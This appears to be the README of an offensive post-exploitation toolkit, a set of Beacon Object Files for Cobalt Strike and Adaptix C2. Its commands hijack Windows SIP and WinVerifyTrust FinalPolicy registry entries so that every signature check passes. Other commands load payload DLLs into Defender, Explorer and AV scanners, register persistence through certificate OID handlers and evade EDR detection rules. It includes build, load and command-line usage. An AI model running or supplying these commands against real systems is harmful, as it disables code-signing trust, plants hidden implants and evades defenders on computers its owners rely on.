# TrustMeBOF

Beacon Object Files for [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro). 8 individual BOFs for Cobalt Strike and Adaptix C2 covering SIP hijack, FinalPolicy bypass, SIP execution surface implants, CI recon, and artifact cleanup.

Clone and build:

```bash
git clone https://github.com/KriyosArcane/TrustMeBOF.git
cd TrustMeBOF
make
```

Requires `x86_64-w64-mingw32-gcc` (mingw-w64). Pre-compiled .o files are included in `bin/` if you want to skip the build.

## Loading

Cobalt Strike:
```
Script Manager -> Load -> cna/tmb.cna
```

Adaptix C2:
```
Load extension -> axscript/tmb.axscript
```

## Structure

```
TrustMeBOF/
├── include/
│   ├── beacon.h                Cobalt Strike BOF API
│   └── tmb_bof.h               Shared header (NT API, hashing, stack strings, GUID aliases)
├── src/
│   ├── tmb_probe.c             CI flag recon (no writes, no admin)
│   ├── tmb_finalpolicy.c       FinalPolicy hijack/clean
│   ├── tmb_sip_hijack.c        Multi-GUID SIP hijack
│   ├── tmb_wow64_hijack.c      WOW6432Node-only SIP hijack
│   ├── tmb_custom_provider.c   Custom action GUID registration
│   ├── tmb_sip_exec.c          SIP execution surface implant
│   ├── tmb_clean.c             Scoped artifact cleanup
│   └── tmb_formatghost.c       CryptDllFormatObject OID persistence
├── bin/                         Compiled .o files (ready to use)
├── cna/tmb.cna                  Cobalt Strike aggressor script
├── axscript/tmb.axscript        Adaptix C2 extension
├── Makefile
├── LICENSE
└── README.md
```

## Commands

> **Log out and log back in** after any registry operation. SIP and Trust Provider values are cached per-process.

### tmb_probe

Query local Code Integrity enforcement state. No writes. No admin.

```
tmb_probe
```

Reports: CI enabled, test-signing, UMCI, debug mode, HVCI, HVCI strict, Smart App Control, audit mode.

### tmb_finalpolicy

Redirect WinVerifyTrust FinalPolicy to SoftpubCleanup. One registry write. System-wide. Every signature check returns success. Stolen signatures show the donor cert's Subject CN as verified publisher in UAC dialogs.

```
tmb_finalpolicy
tmb_finalpolicy --clean
```

### tmb_sip_hijack

Redirect CryptSIPDllVerifyIndirectData to ntdll!DbgUiContinue for selected file types. Writes both native and WOW6432Node registry paths.

GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`

```
tmb_sip_hijack --sip-types pe,ps1,msi
tmb_sip_hijack --all-sips
tmb_sip_hijack --all-sips --sac
tmb_sip_hijack --clean
```

Default targets: PE, PowerShell, MSI.

### tmb_wow64_hijack

Same as tmb_sip_hijack but writes only to WOW6432Node. Hijacks 32-bit WinVerifyTrust callers while leaving the 64-bit registry view clean for EDR inspection.

```
tmb_wow64_hijack --sip-types all
tmb_wow64_hijack --clean
```

### tmb_custom_provider

Register a new action GUID with FinalPolicy pointing to SoftpubCleanup. Same bypass as tmb_finalpolicy but evades detection rules keyed to the well-known Authenticode GUID.

```
tmb_custom_provider {GUID}
tmb_custom_provider --clean {GUID}
```

### tmb_sip_exec

Install a payload DLL on the SIP execution surface. The DLL loads in any process that calls WinVerifyTrust on a matching file type. Affected processes include Explorer, SmartScreen, Defender, certutil, signtool, and AV scanners.

```
tmb_sip_exec install --dll C:\Temp\implant.dll --guid pe
tmb_sip_exec install --dll C:\Temp\implant.dll --guid jscript
tmb_sip_exec remove --guid pe
```

### tmb_clean

Remove all TrustMeBro persistence artifacts. Requires at least one scope flag.

```
tmb_clean --sip
tmb_clean --finalpolicy
tmb_clean --custom-provider {GUID}
tmb_clean --all
```

### tmb_formatghost

Register a DLL as a CryptDllFormatObject handler for a custom OID. The DLL loads when `certutil -dump` or any certificate UI parses a PE containing that OID in its PKCS#7 attributes. Requires admin. Triggered by user interaction, not by WinVerifyTrust verification.

```
tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\Temp\handler.dll
tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --clean
```

## Shared Header (tmb_bof.h)

The shared header provides:

- NT API resolution from ntdll exports (NtOpenKey, NtCreateKey, NtSetValueKey, NtDeleteKey, NtClose, NtQuerySystemInformation)
- FNV-1a hash function for string-free API resolution
- Stack string macros (WSTR_INIT) to avoid .rdata string literals
- GUID alias table with case-insensitive lookup
- Registry path builders for SIP, FinalPolicy, IsMyFileType2, and FormatObject keys
- Output helpers (TMB_OK, TMB_ERR, TMB_WARN, TMB_NTERR)

## Credits

Part of the [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro) toolkit.

## License

MIT License. See [LICENSE](LICENSE).
